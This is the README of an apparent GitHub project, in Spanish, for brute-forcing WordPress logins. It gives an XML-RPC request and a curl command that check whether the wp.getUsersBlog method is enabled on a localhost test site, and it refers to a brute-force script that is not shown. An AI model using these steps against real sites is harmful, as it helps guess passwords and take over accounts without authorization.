# Brute-Forze-on-Wordpress

*Poniendo en la url `xmlrpc.php`*

![image](https://github.com/ManuGalan/Brute-Forze-on-Wordpress/assets/96147300/130965d5-092f-4911-9e08-a90eed654c2f)

*Una vez que sabemos esto Utilizamos este código para ver si esta activo el método 
`wp.getUsersBlog` que nos va a permitir enumerar credenciales válidas*

Para ello crearemos un archivo con ese código dentro:

```
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

```
curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml
```
Si en el output de este comando encontramos `wp.getUsersBlog` 

Podremos ejecutar el script con éxito (Cambiando los apartados que indica)
